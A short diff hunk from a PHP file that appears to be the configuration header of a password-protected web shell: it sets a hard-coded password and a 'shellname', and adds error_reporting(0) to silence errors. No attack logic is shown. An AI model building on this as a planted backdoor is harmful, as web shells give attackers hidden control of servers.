@@ -4,3 +4,4 @@ $password='yzddmr6';
 $shellname='Hello By yzddmr6';
 $myurl=null;
 $_static=0;
+error_reporting(0);
